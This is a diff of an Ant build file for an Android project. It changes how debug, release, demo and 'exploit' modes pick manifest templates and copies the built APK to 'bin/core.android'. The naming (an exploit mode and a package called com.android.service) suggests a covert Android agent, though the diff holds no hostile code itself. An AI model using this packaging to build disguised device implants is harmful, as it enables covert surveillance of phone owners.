@@ -92,9 +92,8 @@
 
 	<target name="set-debug" depends="libsnoexp">
 		<echo message="********** Set debug mode *********" />
-		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
+		<copy file="preprocess/AndroidManifest.DEBUG.xml" tofile="AndroidManifest.xml" overwrite="true">
 			<filterset>
-				<filter token="GUI_ENABLED" value="true" />
 				<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
 			</filterset>
 		</copy>
@@ -113,9 +112,8 @@
 
 	<target name="set-release" depends="libsnoexp">
 		<echo message="******** Set release mode **********" />
-		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
+		<copy file="preprocess/AndroidManifest.RELEASE.xml" tofile="AndroidManifest.xml" overwrite="true">
 			<filterset>
-				<filter token="GUI_ENABLED" value="false" />
 				<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
 			</filterset>
 		</copy>
@@ -134,9 +132,8 @@
 
 	<target name="set-demo" depends="libsnoexp">
 		<echo message="******** Set demo  mode **********" />
-		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
+		<copy file="preprocess/AndroidManifest.DEBUG.xml" tofile="AndroidManifest.xml" overwrite="true">
 			<filterset>
-				<filter token="GUI_ENABLED" value="true" />
 				<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
 			</filterset>
 		</copy>
@@ -155,9 +152,8 @@
 
 	<target name="set-exploit" depends="libsexp">
 		<echo message="******** Set exploit mode **********" />
-		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
+		<copy file="preprocess/AndroidManifest.DEBUG.xml" tofile="AndroidManifest.xml" overwrite="true">
 			<filterset>
-				<filter token="GUI_ENABLED" value="true" />
 				<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
 			</filterset>
 		</copy>
@@ -247,6 +243,8 @@
 	 -->
 
 	<target name="htdebug" depends="set-debug, debug">
+		<copy file="bin/android_service-debug.apk" toFile="bin/core.android" overwrite="true" />
+		<echo message="bin/core.android" />
 	</target>
 
 	<target name="htrelease" depends="clean, set-release, release">
@@ -264,6 +262,8 @@
 	<target name="htexploit" depends="clean, set-exploit, release">
 		<echo message="adb uninstall com.android.service" />
 		<echo message="adb install bin/android_service-release.apk" />
+		<copy file="bin/android_service-unsigned.apk" toFile="bin/core.android" overwrite="true" />
+		<echo message="bin/core.android" />
 	</target>
 
 	<target name="dist" depends="htrelease">
